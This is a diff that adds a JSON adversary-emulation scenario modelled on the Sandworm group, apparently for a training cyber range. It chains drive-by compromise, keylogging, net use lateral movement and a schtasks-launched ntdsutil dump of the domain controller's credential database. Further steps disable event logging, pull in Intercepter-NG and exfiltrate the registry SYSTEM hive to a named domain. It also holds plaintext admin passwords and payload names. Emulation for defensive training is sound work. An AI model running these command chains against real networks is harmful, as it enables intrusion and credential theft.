@@ -1,0 +1,792 @@
+{
+    "meta_data": {
+        "name": "sandworm",
+        "version": "v1.0.0",
+        "title": "Sandworm Inspired Scenario",
+        "description": "This scenario is based on the threat group 'Sandworm Team', a known Russian cyber threat",
+        "author": "Attack Content",
+        "suggested_duration": 665
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "self.tool_name2",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "Keylogging",
+            "technique": "Collection",
+            "label": "Get-keyboard-data_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "keylog_timer": 200000
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "DiscoverDomainAccounts_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "RemoteServices_NetUse",
+            "technique": "LateralMovement",
+            "label": "Netuse_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "net use \\\\",
+                            "self.target_2_hostname",
+                            " /User:",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " ",
+                            "self.target_2_password"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "RemoteFileCopy_RoboCopy",
+            "technique": "LateralMovement",
+            "label": "Filecopy_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2"
+            }
+        },
+        {
+            "tactic": "ScheduledTask",
+            "technique": "LateralMovement",
+            "label": "ScheduledTask",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ",
+                            "self.target_2_taskname",
+                            " /TR 'c:\\windows\\system32\\ntdsutil.exe \"activate instance ntds\" ifm \"create full c:\\test\" q q'  /RL Highest /U ",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " /P ",
+                            "self.target_2_password",
+                            " /RU ",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " /RP ",
+                            "self.target_2_password",
+                            " /S ",
+                            "self.target_2_hostname"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTaskExecution",
+            "technique": "Execution",
+            "label": "scheduled_task_execution",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd.exe /c schtasks.exe /run /tn ",
+                            "self.target_2_taskname",
+                            " /U ",
+                            "self.target_2_username",
+                            "@",
+                            "self.domain",
+                            " /P ",
+                            "self.target_2_password",
+                            " /S ",
+                            "self.target_2_hostname"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_2",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "DisableWindowsEventLogging",
+            "technique": "DefenseEvasion",
+            "label": "DisableWindowsEventLogging_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "ProcessDiscovery_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "tune": {
+                    "command": "cmd /c tasklist"
+                }
+            }
+        },
+        {
+            "tactic": "Ntds",
+            "technique": "CredentialAccess",
+            "label": "CredentialAccess_NTDS_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "FileAndDirectoryDiscovery_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "GetIntercepterTool_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_store_server": "self.driveby_domain2",
+                    "file_name": "self.tool_name2",
+                    "output_directory": "C:\\Users\\Public",
+                    "output_file_name": "explorer.txt"
+                }
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "exfil": "self.exfil",
+                "tune": {
+                    "exfil_file": ":\\backup\\registry\\system"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": {
+            "kind": "comprehension",
+            "element": {
+                "kind": "bin op",
+                "op": "add",
+                "left": {
+                    "kind": "bin op",
+                    "op": "add",
+                    "left": {
+                        "kind": "bin op",
+                        "op": "add",
+                        "left": {
+                            "kind": "bin op",
+                            "op": "add",
+                            "left": "dev-domain-",
+                            "right": {
+                                "kind": "name",
+                                "id": "prefix"
+                            }
+                        },
+                        "right": "_"
+                    },
+                    "right": {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "str"
+                        },
+                        "args": [
+                            {
+                                "kind": "name",
+                                "id": "x"
+                            }
+                        ]
+                    }
+                },
+                "right": ".com"
+            },
+            "generators": [
+                {
+                    "iter": {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "range"
+                        },
+                        "args": [
+                            500000
+                        ]
+                    },
+                    "target": {
+                        "kind": "name",
+                        "id": "x"
+                    }
+                }
+            ]
+        },
+        "ip": {
+            "kind": "comprehension",
+            "element": {
+                "kind": "bin op",
+                "op": "add",
+                "left": {
+                    "kind": "bin op",
+                    "op": "add",
+                    "left": {
+                        "kind": "bin op",
+                        "op": "add",
+                        "left": {
+                            "kind": "bin op",
+                            "op": "add",
+                            "left": "75.",
+                            "right": {
+                                "kind": "call",
+                                "func": {
+                                    "kind": "name",
+                                    "id": "str"
+                                },
+                                "args": [
+                                    {
+                                        "kind": "name",
+                                        "id": "x"
+                                    }
+                                ]
+                            }
+                        },
+                        "right": "."
+                    },
+                    "right": {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "str"
+                        },
+                        "args": [
+                            {
+                                "kind": "name",
+                                "id": "y"
+                            }
+                        ]
+                    }
+                },
+                "right": ".1/24"
+            },
+            "generators": [
+                {
+                    "iter": {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "range"
+                        },
+                        "args": [
+                            256
+                        ]
+                    },
+                    "target": {
+                        "kind": "name",
+                        "id": "x"
+                    }
+                },
+                {
+                    "iter": {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "range"
+                        },
+                        "args": [
+                            256
+                        ]
+                    },
+                    "target": {
+                        "kind": "name",
+                        "id": "y"
+                    }
+                }
+            ]
+        },
+        "binary": {
+            "kind": "comprehension",
+            "element": {
+                "kind": "bin op",
+                "op": "add",
+                "left": {
+                    "kind": "bin op",
+                    "op": "add",
+                    "left": {
+                        "kind": "bin op",
+                        "op": "add",
+                        "left": {
+                            "kind": "call",
+                            "func": {
+                                "kind": "name",
+                                "id": "str"
+                            },
+                            "args": [
+                                {
+                                    "kind": "name",
+                                    "id": "x"
+                                }
+                            ]
+                        },
+                        "right": "_"
+                    },
+                    "right": {
+                        "kind": "name",
+                        "id": "prefix"
+                    }
+                },
+                "right": "_CR_Payload.exe"
+            },
+            "generators": [
+                {
+                    "iter": {
+                        "kind": "call",
+                        "func": {
+                            "kind": "name",
+                            "id": "range"
+                        },
+                        "args": [
+                            500000
+                        ]
+                    },
+                    "target": {
+                        "kind": "name",
+                        "id": "x"
+                    }
+                }
+            ]
+        }
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "5",
+                "ioc-ip_callback": "122.49.215.108/24",
+                "ioc-domain_callback": "inform.bedircati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "Intercepter-NG.v1.3.zip.zip"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "range": {
+            "query-ad_domain": "site.lan"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "161.135.2.34/24",
+                "ioc-domain_driveby": "oklahomapumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "query": {
+                    "filter": {
+                        "hostname": "dev-win10-1"
+                    }
+                },
+                "query-target_control_ip": "10.10.5.101",
+                "query-target_ip": "172.16.5.101",
+                "query-target_hostname": "dev-win10-1",
+                "payload_destination": "c:\\users\\Public",
+                "query-target_email": "Madelyn.Luna@site.com",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!",
+                "query-target_domain": "site.lan"
+            },
+            "2": {
+                "query": {
+                    "tag": {
+                        "domain_controller": "true"
+                    }
+                },
+                "query-target_control_ip": "10.10.5.101",
+                "query-exfil_files": [
+                    "C:\\backup\\registry\\system"
+                ],
+                "payload_destination": "c:\\users\\Public",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!",
+                "query-target_domain": "site.lan"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "range": {
+                "path": [
+                    "range"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_2": {
+                "path": [
+                    "targets",
+                    "2"
+                ]
+            },
+            "target_2_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "target_2_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            },
+            "target_2_hostname": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-target_hostname"
+                ]
+            },
+            "target_2_file_location": {
+                "path": [
+                    "targets",
+                    "2",
+                    "payload_destination"
+                ]
+            },
+            "target_2_taskname": {
+                "path": [
+                    "targets",
+                    "2",
+                    "ioc-taskname"
+                ]
+            },
+            "domain_admin_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "domain_admin_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            },
+            "ad_domain": {
+                "path": "site.lan"
+            },
+            "domain": {
+                "path": [
+                    "range",
+                    "query-ad_domain"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt2": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
